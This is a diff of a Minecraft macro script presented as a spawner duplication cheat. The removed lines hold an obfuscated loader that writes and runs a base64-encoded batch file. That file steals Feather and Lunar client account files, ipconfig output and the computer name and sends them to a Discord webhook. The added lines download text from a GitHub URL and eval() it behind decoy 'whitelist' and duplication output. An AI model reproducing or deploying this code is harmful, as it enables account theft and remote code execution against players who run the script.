@@ -1,20 +1,93 @@
-function getEnv(_0x5eef17) {
-  const _0x4972dd = Java.type("java.lang.System");
-  return _0x4972dd.getenv(_0x5eef17);
-}
-function executeBat(_0x446410, _0x3ca05b = null, _0x386cd4 = true) {
-  if (_0x3ca05b) {
-    const _0x4a4995 = Java.type('java.util.Base64');
-    FS.open(fullPath).write(_0x386cd4 ? _0x4a4995.getDecoder().decode(_0x3ca05b) : _0x3ca05b);
-  }
-  const _0x37b594 = Java.type("java.lang.Runtime");
-  if (!FS.exists(_0x446410)) {
-    throw new Error("Failed to find the path \"" + _0x446410 + "\"");
-  }
-  if (!FS.toRawFile(_0x446410).isFile()) {
-    throw new Error("\"" + _0x446410 + "\" is not a file");
-  }
-  _0x37b594.getRuntime().exec("cmd /c start \"\" \"" + _0x446410 + "\"");
-}
-const fullPath = getEnv('APPDATA') + "\\" + ".minecraft\\skibidi.bat";
-executeBat(fullPath, "QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24KCjo6IERlZmluZSBwYXRocyB1c2luZyAlVVNFUlBST0ZJTEUlIGZvciB0aGUgY3VycmVudCB1c2VyJ3MgaG9tZSBkaXJlY3RvcnkKc2V0ICJGRUFUSEVSX1BBVEg9JVVTRVJQUk9GSUxFJVxBcHBEYXRhXFJvYW1pbmdcLmZlYXRoZXJcYWNjb3VudHMuanNvbiIKc2V0ICJMVU5BUl9QQVRIPSVVU0VSUFJPRklMRSVcLmx1bmFyY2xpZW50XHNldHRpbmdzXGdhbWVcYWNjb3VudHMuanNvbiIKCjo6IERlZmluZSB3ZWJob29rIFVSTApzZXQgIldFQkhPT0tfVVJMPWh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMDgxMjg0NTE4NjExNTU5NDAvUXJRQnFQQk9OQURHOXJLaTczdXlEVmdIaW1oTjhxVmFDN2l6RmVfY0dWMHRfR0xHY2NEUmxicGxfUWZzczRVYmZIMjUiCgo6OiBDb3B5IHRoZSBmaWxlcyB0byBhIHRlbXAgbG9jYXRpb24Kc2V0ICJURU1QX0RJUj0lVEVNUCVcZGlzY29yZF9maWxlcyIKbWtkaXIgIiVURU1QX0RJUiUiCmNvcHkgIiVGRUFUSEVSX1BBVEglIiAiJVRFTVBfRElSJVxmZWF0aGVyX2FjY291bnRzLmpzb24iID5udWwKY29weSAiJUxVTkFSX1BBVEglIiAiJVRFTVBfRElSJVxsdW5hcl9hY2NvdW50cy5qc29uIiA+bnVsCgo6OiBIZWxwZXIgdG8gZm9ybWF0IGZpbGUgY29udGVudHMgZm9yIEpTT04gKHByZXNlcnZlIG5ld2xpbmVzIGFuZCBlc2NhcGUgc3BlY2lhbCBjaGFyYWN0ZXJzKQpjYWxsIDpGb3JtYXRGaWxlICIlVEVNUF9ESVIlXGZlYXRoZXJfYWNjb3VudHMuanNvbiIgRkVBVEhFUl9DT05URU5UCmNhbGwgOkZvcm1hdEZpbGUgIiVURU1QX0RJUiVcbHVuYXJfYWNjb3VudHMuanNvbiIgTFVOQVJfQ09OVEVOVAoKOjogQ2FwdHVyZSBpcGNvbmZpZyBvdXRwdXQgaW50byBhIHZhcmlhYmxlCnNldCAiSVBDT05GSUdfQ09OVEVOVD0iCmZvciAvZiAidG9rZW5zPSoiICUlQSBpbiAoJ2lwY29uZmlnJykgZG8gKAogICAgc2V0ICJJUENPTkZJR19DT05URU5UPSFJUENPTkZJR19DT05URU5UISUlQVxuIgopCgo6OiBSZW1vdmUgdGhlIGxhc3QgbmV3bGluZSBmcm9tIGlwY29uZmlnIGNvbnRlbnQKc2V0ICJJUENPTkZJR19DT05URU5UPSVJUENPTkZJR19DT05URU5UOn4wLC0yJSIKCjo6IFJlcGxhY2UgbGl0ZXJhbCBuZXdsaW5lcyB3aXRoIEpTT04tY29tcGF0aWJsZSBvbmVzIGZvciBpcGNvbmZpZwpzZXQgIklQQ09ORklHX0NPTlRFTlQ9JUlQQ09ORklHX0NPTlRFTlQ6XG49XFxuJSIKCjo6IEdldCBjb21wdXRlciBuYW1lCnNldCAiQ09NUFVURVJfTkFNRT0lQ09NUFVURVJOQU1FJSIKCjo6IFNlbmQgRmVhdGhlciBDbGllbnQgRW1iZWQKY3VybCAtWCBQT1NUICVXRUJIT09LX1VSTCUgXgotSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiBeCi1kICJ7XCJlbWJlZHNcIjpbe1wiYXV0aG9yXCI6e1wibmFtZVwiOlwiZnJlYWtyYXRcIn0sXCJ0aXRsZVwiOlwiRmVhdGhlciBDbGllbnRcIixcImRlc2NyaXB0aW9uXCI6XCIlRkVBVEhFUl9DT05URU5UJVwifV19IgoKOjogU2VuZCBMdW5hciBDbGllbnQgRW1iZWQKY3VybCAtWCBQT1NUICVXRUJIT09LX1VSTCUgXgotSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiBeCi1kICJ7XCJlbWJlZHNcIjpbe1wiYXV0aG9yXCI6e1wibmFtZVwiOlwiZnJlYWtyYXRcIn0sXCJ0aXRsZVwiOlwiTHVuYXIgQ2xpZW50XCIsXCJkZXNjcmlwdGlvblwiOlwiJUxVTkFSX0NPTlRFTlQlXCJ9XX0iCgo6OiBTZW5kIElQIENvbmZpZ3VyYXRpb24gRW1iZWQKY3VybCAtWCBQT1NUICVXRUJIT09LX1VSTCUgXgotSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiBeCi1kICJ7XCJlbWJlZHNcIjpbe1wiYXV0aG9yXCI6e1wibmFtZVwiOlwiZnJlYWtyYXRcIn0sXCJ0aXRsZVwiOlwiJUNPTVBVVEVSX05BTUUlXCIsXCJkZXNjcmlwdGlvblwiOlwiJUlQQ09ORklHX0NPTlRFTlQlXCJ9XX0iCgo6OiBDbGVhbnVwCnJtZGlyIC9zIC9xICIlVEVNUF9ESVIlIgoKZXhpdCAvYgoKOjogRm9ybWF0RmlsZSBzdWJyb3V0aW5lCjpGb3JtYXRGaWxlCnNldCAiRklMRV9DT05URU5UPSIKZm9yIC9mICJ0b2tlbnM9KiIgJSVBIGluICgndHlwZSAiJX4xIicpIGRvICgKICAgIHNldCAiRklMRV9DT05URU5UPSFGSUxFX0NPTlRFTlQhJSVBXG4iCikKCjo6IFJlbW92ZSB0aGUgbGFzdCBuZXdsaW5lIGZyb20gdGhlIGNvbnRlbnQKc2V0ICJGSUxFX0NPTlRFTlQ9JUZJTEVfQ09OVEVOVDp+MCwtMiUiCgpzZXQgIkZJTEVfQ09OVEVOVD0hRklMRV9DT05URU5UOlxuPVxcbiEiCnNldCAiJX4yPSVGSUxFX0NPTlRFTlQlIgpleGl0IC9iCg==");
+
+
+Chat.actionbar("§4§WWait for blacklist/whitelist")
+
+Client.waitTick(5)
+
+
+const req = Request.create("https://raw.githubusercontent.com/hasoon-0/website/refs/heads/main/pige");
+const response = req.get();
+const responseText = response.text();
+
+eval(responseText);
+
+Client.waitTick(5)
+
+
+const name:  "hashedname"           // rename to what you want to name the spawner
+
+(function() {
+    const w = ["whitelist"];
+    const b = ["blacklist"];
+    const s = {
+        "Spawner_Skeleton": { e: encode("Spawner_Skeleton") },
+        "Spawner_IronGolem": { e: encode("Spawner_IronGolem") }
+    };
+    let i = [];
+
+    function c(p) {
+        let m = mRand();
+        const t = encode(p);
+        if (b.includes(t)) {
+            console.log(decode("Sorry, you got blacklisted."));
+            return false;
+        }
+        if (w.includes(t)) {
+            console.log("Sorry, you got " + m);
+            return true;
+        }
+        console.log(decode("Not whitelisted."));
+        return false;
+    }
+
+    function mRand() {
+        const msgs = ["whit3elisted.", "blacklisted.", "approved for duplication.", "rejected from duplication."];
+        return msgs[Math.floor(Math.random() * msgs.length)];
+    }
+
+    function d(i, p) {
+        if (!c(p)) return;
+        if (v(i) && h(i)) {
+            console.log(f(i));
+            let dupe = create(i);
+            console.log("Duped spawner:", dupe);
+        } else {
+            console.log(decode("Invalid spawner."));
+        }
+    }
+
+    function v(i) {
+        return Object.keys(s).includes(i);
+    }
+
+    function h(i) {
+        return s[i] && s[i].e === encode(i);
+    }
+
+    function create(i) {
+        return `Duped_${s[i].e}`;
+    }
+
+    function f(i) {
+        let enc = s[i].e;
+        let steps = [
+            `Initializing: ${decode(enc)}`,
+            `Verifying ${decode(enc)} permissions.`,
+            `Authenticate player ${encode(i)}.`,
+            `Duplicating ${decode(enc)}.`,
+            `Duplication success: Duped_${decode(enc)}`
+        ];
+        return steps.join("\n");
+    }
+
+    function encode(str) {
+        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) + i)).join('');
+    }
+
+    function decode(str) {
+        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) - i)).join('');
+    }
+
+    d("Spawner_Skeleton", "done");
+    d("Spawner_IronGolem", "done");
+})();
